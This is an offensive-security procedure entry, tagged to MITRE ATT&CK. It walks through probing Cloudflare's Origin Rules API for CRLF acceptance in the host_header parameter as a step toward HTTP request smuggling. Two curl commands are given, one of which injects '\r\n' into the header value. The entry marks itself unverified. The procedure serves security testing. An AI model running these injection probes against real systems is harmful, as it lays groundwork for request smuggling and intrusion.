---
tags:
  - crlf-injection
  - api-vulnerability
  - cloudflare
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-api-request]]'
platforms:
  - Cloud (Cloudflare)
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 8ed3cf1a-6245-4d6b-813a-4e747cad774e
created_at: '2025-12-13T09:01:22.268Z'
updated_at: '2025-12-13T09:01:22.268Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Identify Insufficient Validation in Host Header Parameter

## Summary

This procedure involves testing the Cloudflare Origin Rules API for insufficient input validation in the host_header action parameter, specifically checking if it accepts CRLF characters without rejection, setting the stage for further exploitation.

## Description

The procedure targets the Origin Rules API endpoint, where the host_header parameter is meant to override the Host header but lacks proper sanitization. By sending test requests with CRLF, attackers can confirm the vulnerability, which leads to potential HTTP request smuggling. This is applicable in Cloudflare-managed environments and requires API access.

## Requirements

1. Valid Cloudflare API token and zone ID
2. Network access to Cloudflare API (api.cloudflare.com)
3. Tool: curl for sending HTTP requests

## Defense

Defensive measures and detection strategies:

- Implement strict input validation on API parameters to reject CRLF characters
- Monitor API logs for unusual characters in request parameters

## Objectives

1. Confirm vulnerability in host_header parameter
2. Verify acceptance of invalid input
3. Prepare for header injection

## Instructions

### Step 1: Prepare API Request

**Context**: Set up the base request to interact with the Origin Rules API.

Execute [[commands/curl-api-request]] to send a test request:

```bash
curl -X POST 'https://api.cloudflare.com/client/v4/zones/{zone_id}/origin_rules' \
  -H 'Authorization: Bearer {api_token}' \
  -H 'Content-Type: application/json' \
  --data '{"action_parameters": {"host_header": "example.com"}}'
```

> This establishes the baseline API interaction.

### Step 2: Test for CRLF Acceptance

**Context**: Introduce CRLF characters to check validation.

Modify the request to include \r\n in host_header and execute:

```bash
curl -X POST 'https://api.cloudflare.com/client/v4/zones/{zone_id}/origin_rules' \
  -H 'Authorization: Bearer {api_token}' \
  -H 'Content-Type: application/json' \
  --data '{"action_parameters": {"host_header": "example.com\r\nTest"}}'
```

> Expect no validation error if vulnerable.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-api-request]]

## Tools Used

- [[tools/curl]]

## Tags

- [[crlf-injection]]
- [[api-vulnerability]]
